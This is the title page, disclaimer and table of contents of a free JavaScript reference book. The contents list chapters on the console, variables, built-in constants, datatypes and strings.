JavaScript
Notes for ProfessionalsJavaScript®
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial JavaScript ® group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks
Contents
About  1  ................................................................................................................................................................................... 
Chapter 1: Getting started with JavaScript  2  ..................................................................................................... 
Section 1.1: Using console.log()  2  ..................................................................................................................................... 
Section 1.2: Using the DOM API  4  .................................................................................................................................... 
Section 1.3: Using window.alert()  5  .................................................................................................................................. 
Section 1.4: Using window.prompt()  6  ............................................................................................................................. 
Section 1.5: Using window.conﬁrm()  7  ............................................................................................................................ 
Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or image ﬁle)  8  ................................................. 
Chapter 2: JavaScript Variables  10  ......................................................................................................................... 
Section 2.1: Deﬁning a Variable  10  ................................................................................................................................. 
Section 2.2: Using a Variable  10  ..................................................................................................................................... 
Section 2.3: Types of Variables  10  .................................................................................................................................. 
Section 2.4: Arrays and Objects  11  ................................................................................................................................ 
Chapter 3: Built-in Constants  12  ................................................................................................................................ 
Section 3.1: null  12  ............................................................................................................................................................. 
Section 3.2: Testing for NaN using isNaN()  12  .............................................................................................................. 
Section 3.3: NaN  13  .......................................................................................................................................................... 
Section 3.4: undeﬁned and null  14  .................................................................................................................................. 
Section 3.5: Inﬁnity and -Inﬁnity  15  ................................................................................................................................. 
Section 3.6: Number constants  15  .................................................................................................................................. 
Section 3.7: Operations that return NaN  16  ................................................................................................................... 
Section 3.8: Math library functions that return NaN  16  ................................................................................................ 
Chapter 4: Comments  17  .............................................................................................................................................. 
Section 4.1: Using Comments  17  ..................................................................................................................................... 
Section 4.2: Using HTML comments in JavaScript (Bad practice)  17  ........................................................................ 
Chapter 5: Console  19  ..................................................................................................................................................... 
Section 5.1: Measuring time - console.time()  22  ............................................................................................................ 
Section 5.2: Formatting console output  23  .................................................................................................................... 
Section 5.3: Printing to a browser's debugging console  24  ......................................................................................... 
Section 5.4: Including a stack trace when logging - console.trace()  26  ..................................................................... 
Section 5.5: Tabulating values - console.table()  26  ...................................................................................................... 
Section 5.6: Counting - console.count()  28  .................................................................................................................... 
Section 5.7: Clearing the console - console.clear()  30  .................................................................................................. 
Section 5.8: Displaying objects and XML interactively - console.dir(), console.dirxml()  30  ...................................... 
Section 5.9: Debugging with assertions - console.assert()  32  ..................................................................................... 
Chapter 6: Datatypes in JavaScript  33  ................................................................................................................. 
Section 6.1: typeof  33  ....................................................................................................................................................... 
Section 6.2: Finding an object's class  34  ........................................................................................................................ 
Section 6.3: Getting object type by constructor name  34  ............................................................................................ 
Chapter 7: Strings  37  ....................................................................................................................................................... 
Section 7.1: Basic Info and String Concatenation  37  ..................................................................................................... 
Section 7.2: Reverse String  38  ......................................................................................................................................... 
Section 7.3: Comparing Strings Lexicographically  39  ................................................................................................... 
Section 7.4: Access character at index in string  40  ....................................................................................................... 
Section 7.5: Escaping quotes  40  ...................................................................................................................................... 
Section 7.6: Word Counter  41  .......................................................................................................................................... 
Section 7.7: Trim whitespace  41  ...................................................................................................................................... 
Section 7.8: Splitting a string into an array  41  .............................................................................................................. 
Section 7.9: Strings are unicode  42  ................................................................................................................................. 
Section 7.10: Detecting a string  42  .................................................................................................................................. 
Section 7.11: Substrings with slice  43  ............................................................................................................................... 
Section 7.12: Character code  43  ...................................................................................................................................... 
Section 7.13: String Representations of Numbers  43  .................................................................................................... 
